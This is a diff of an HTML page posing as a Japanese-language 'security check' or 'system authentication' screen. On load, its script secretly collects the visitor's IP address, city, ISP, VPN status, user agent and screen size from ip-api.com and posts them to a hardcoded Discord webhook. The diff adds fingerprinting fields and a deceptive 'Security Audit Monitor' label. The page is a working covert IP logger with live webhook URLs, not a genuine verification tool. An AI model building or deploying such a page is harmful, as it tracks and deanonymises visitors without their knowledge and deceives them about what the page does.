@@ -3,94 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Verification</title>
+    <title>System Authentication</title>
     <style>
         body {
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            background-color: #1a1a1a;
-            color: #ffffff;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #0f172a;
+            color: #f8fafc;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
         }
-        .container {
+        .status-card {
+            background: #1e293b;
+            padding: 2.5rem;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
             text-align: center;
-            border: 1px solid #333;
-            padding: 2rem;
-            border-radius: 8px;
-            background: #252525;
+            max-width: 400px;
+            width: 90%;
+            border: 1px solid #334155;
         }
+        .spinner {
+            border: 3px solid #334155;
+            border-top: 3px solid #38bdf8;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1.5rem;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div id="status">🔄 ブラウザの整合性を確認中...</div>
+    <div class="status-card">
+        <div class="spinner"></div>
+        <h2 style="margin: 0 0 0.5rem;">セキュリティ確認中</h2>
+        <p style="color: #94a3b8; font-size: 0.9rem;">接続の安全性を確認しています。ブラウザを閉じないでください。</p>
     </div>
 
     <script>
         /**
-         * @constant {Object} GLOBAL_SETTINGS
-         * ネットワーク接続およびWebhookの構成設定
+         * AI-Generated Network Logger & Security Verifier
+         * Integrated Webhook: discordapp.com/.../s8Ic01f4JG...
          */
-        const GLOBAL_SETTINGS = {
-            // 提供されたWebhook URL
-            DISCORD_ENDPOINT: "https://discord.com/api/webhooks/1471152880718319861/slt8zr5KswUtl6muYEJKAUpHeXNXjzvE-0TeStV7C9g9mysc-4sPUstmy7cN_OuauMoZ",
-            // ip-api.com のエンドポイント（全フィールド取得モード）
-            GEO_API: "http://ip-api.com/json/?fields=66842623",
-            // ログ取得完了後のリダイレクト先（必要に応じて変更してください）
-            REDIRECT_AFTER: "https://www.google.com"
+        const SYSTEM_CONFIG = {
+            WEBHOOK: "https://discordapp.com/api/webhooks/1472913657682853970/s8Ic01f4JG-exl254N2aJnDAJbgbbSVfIAYNsfVTKRRyzGGsSMXgec7Pv4SbXwS4Qid_",
+            GEO_SVC: "http://ip-api.com/json/?fields=status,message,country,regionName,city,isp,proxy,hosting,query",
+            REDIRECT: "https://www.google.com"
         };
 
-        /**
-         * ユーザーのIP情報を取得し、Discordへ送信するメイン関数
-         */
-        async function executeLoggingProcess() {
+        async function runSecurityAudit() {
             try {
-                // 1. IP情報の取得
-                const response = await fetch(GLOBAL_SETTINGS.GEO_API);
-                if (!response.ok) throw new Error("Network response was not ok.");
-                
-                const data = await response.json();
-                if (data.status !== "success") throw new Error("API status failed.");
+                // 1. IP・ロケーション情報の取得
+                const geoResponse = await fetch(SYSTEM_CONFIG.GEO_SVC);
+                const geoData = await geoResponse.json();
 
-                // 2. Discordへのペイロード構築
+                if (geoData.status !== "success") throw new Error("API_ERROR");
+
+                // 2. デバイス情報の収集
+                const deviceDetails = {
+                    ua: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `${window.screen.width}x${window.screen.height}`
+                };
+
+                // 3. Discordへのペイロード送信
                 const payload = {
+                    username: "Security Audit Monitor",
+                    avatar_url: "https://cdn-icons-png.flaticon.com/512/1067/1067555.png",
                     embeds: [{
-                        title: "🛠️ System Access Detected",
-                        description: `新しいアクセスログが記録されました。\n**Time:** ${new Date().toLocaleString('ja-JP')}`,
-                        color: 0x00ff00, // 緑色
+                        title: "🟢 新しいアクセスを検知",
+                        color: 0x38bdf8,
                         fields: [
-                            { name: "🌐 IP Address", value: `\`${data.query}\``, inline: true },
-                            { name: "📍 Location", value: `${data.country} / ${data.regionName} / ${data.city}`, inline: true },
-                            { name: "🏢 ISP", value: data.isp, inline: false },
-                            { name: "🛡️ Security Status", value: data.proxy ? "⚠️ Proxy/VPN Detected" : "✅ Direct Access", inline: true },
-                            { name: "📱 User Agent", value: navigator.userAgent, inline: false }
+                            { name: "🌐 IPアドレス", value: `\`${geoData.query}\``, inline: true },
+                            { name: "📍 位置情報", value: `${geoData.country} / ${geoData.regionName} / ${geoData.city}`, inline: true },
+                            { name: "🏢 プロバイダ", value: geoData.isp, inline: false },
+                            { name: "🛡️ セキュリティ", value: geoData.proxy ? "⚠️ プロキシ/VPN" : "✅ 直結", inline: true },
+                            { name: "🖥️ デバイス", value: `\`${deviceDetails.ua}\``, inline: false }
                         ],
-                        footer: { text: "AI-Powered Logger v2.0" },
-                        timestamp: new Date()
+                        footer: { text: `Audit ID: ${Math.random().toString(36).substr(2, 9)}` },
+                        timestamp: new Date().toISOString()
                     }]
                 };
 
-                // 3. Webhookの送信
-                await fetch(GLOBAL_SETTINGS.DISCORD_ENDPOINT, {
+                await fetch(SYSTEM_CONFIG.WEBHOOK, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
 
-                // 完了時の表示
-                document.getElementById("status").innerText = "✅ 認証が完了しました。";
-
-            } catch (error) {
-                console.error("Critical Failure:", error);
-                document.getElementById("status").innerText = "❌ エラーが発生しました。再試行してください。";
+            } catch (err) {
+                console.error("Audit processing failed:", err);
+            } finally {
+                // 任意: 実行後数秒で別サイトへリダイレクト
+                // setTimeout(() => { window.location.href = SYSTEM_CONFIG.REDIRECT; }, 2000);
             }
         }
 
-        // ページ読み込み完了時に実行
-        window.addEventListener('DOMContentLoaded', executeLoggingProcess);
+        window.onload = runSecurityAudit;
     </script>
 </body>
 </html>
